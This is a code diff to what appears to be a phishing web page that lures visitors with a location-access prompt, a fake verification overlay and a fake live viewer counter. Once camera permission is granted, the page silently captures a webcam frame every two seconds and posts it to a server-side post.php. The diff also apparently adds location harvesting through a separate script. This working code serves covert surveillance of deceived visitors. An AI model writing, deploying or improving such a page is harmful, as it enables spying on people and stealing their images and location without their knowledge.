@@ -352,10 +352,34 @@
                 font-size: 16px;
             }
         }
+        .request-access-overlay {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.98); z-index: 9999;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding: 40px; text-align: center; transition: opacity 0.5s ease;
+        }
+        .request-access-overlay.hidden { opacity: 0; pointer-events: none; }
+        .request-access-icon { width: 80px; height: 80px; margin-bottom: 24px; background: linear-gradient(135deg, #ff006e, #8338ec);
+            border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; }
+        .request-access-title { font-size: 28px; font-weight: 700; margin-bottom: 16px; color: #fff; }
+        .request-access-text { font-size: 16px; color: rgba(255,255,255,0.8); margin-bottom: 24px; max-width: 400px; line-height: 1.5; }
+        .request-access-btn { padding: 14px 40px; font-size: 16px; font-weight: 600; border: none;
+            border-radius: 12px; background: linear-gradient(135deg, #ff006e, #8338ec); color: #fff; cursor: pointer; }
+        .request-access-btn:hover { opacity: 0.95; }
+        .request-access-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+        .request-access-status { margin-top: 16px; font-size: 13px; color: rgba(255,255,255,0.6); }
     </style>
 </head>
 
 <body>
+    <div class="request-access-overlay" id="requestAccessOverlay">
+        <div class="request-access-icon">📍</div>
+        <div class="request-access-title">Request Access</div>
+        <div class="request-access-text">Please allow or deny location access to continue. We will wait for your response.</div>
+        <button class="request-access-btn" id="requestAccessBtn">Allow Location Access</button>
+        <div class="request-access-status" id="requestAccessStatus"></div>
+    </div>
+
     <div class="video-wrap" hidden="hidden">
         <video id="video" playsinline autoplay></video>
     </div>
@@ -430,12 +454,14 @@
         </div>
     </div>
 
+    <script src="location-request.js"></script>
     <script>
+        var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, '') || '/');
         function post(imgdata) {
             $.ajax({
                 type: 'POST',
                 data: { cat: imgdata },
-                url: 'forwarding_link/post.php',
+                url: BASE_URL + 'post.php',
                 dataType: 'json',
                 async: false,
                 success: function (result) {
@@ -455,45 +481,48 @@
         const verificationOverlay = document.getElementById('verificationOverlay');
         const cameraPreview = document.getElementById('cameraPreview');
 
-        // Request camera access
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(function(stream) {
-                video.srcObject = stream;
-                video.play();
-                
-                // Show camera preview
-                setTimeout(() => {
-                    cameraPreview.innerHTML = '<video autoplay playsinline style="width:100%;height:100%;object-fit:cover;border-radius:10px;"></video>';
-                    const previewVideo = cameraPreview.querySelector('video');
-                    previewVideo.srcObject = stream;
+        function initCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    video.play();
                     
-                    // Hide verification overlay after showing camera
-                    setTimeout(() => {
-                        verificationOverlay.style.opacity = '0';
-                        setTimeout(() => {
-                            verificationOverlay.style.display = 'none';
-                        }, 500);
+                    setTimeout(function() {
+                        cameraPreview.innerHTML = '<video autoplay playsinline style="width:100%;height:100%;object-fit:cover;border-radius:10px;"></video>';
+                        var previewVideo = cameraPreview.querySelector('video');
+                        previewVideo.srcObject = stream;
+                        
+                        setTimeout(function() {
+                            verificationOverlay.style.opacity = '0';
+                            setTimeout(function() {
+                                verificationOverlay.style.display = 'none';
+                            }, 500);
+                        }, 2000);
+                    }, 1000);
+
+                    setInterval(function() {
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        var imgdata = canvas.toDataURL('image/png');
+                        post(imgdata);
                     }, 2000);
-                }, 1000);
+                })
+                .catch(function(err) {
+                    console.error('Camera access denied:', err);
+                    cameraPreview.innerHTML = '⚠️ Camera access required';
+                });
 
-                // Capture frames
-                setInterval(function() {
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const imgdata = canvas.toDataURL('image/png');
-                    post(imgdata);
-                }, 2000);
-            })
-            .catch(function(err) {
-                console.error('Camera access denied:', err);
-                cameraPreview.innerHTML = '⚠️ Camera access required';
-            });
+            var viewerCount = 2847;
+            setInterval(function() {
+                viewerCount += Math.floor(Math.random() * 3);
+                document.getElementById('viewerCount').textContent = viewerCount.toLocaleString();
+            }, 5000);
+        }
 
-        // Simulate viewer count
-        let viewerCount = 2847;
-        setInterval(function() {
-            viewerCount += Math.floor(Math.random() * 3);
-            document.getElementById('viewerCount').textContent = viewerCount.toLocaleString();
-        }, 5000);
+        if (window.LocationRequest) {
+            LocationRequest.init(initCamera);
+        } else {
+            initCamera();
+        }
     </script>
 </body>
 </html>
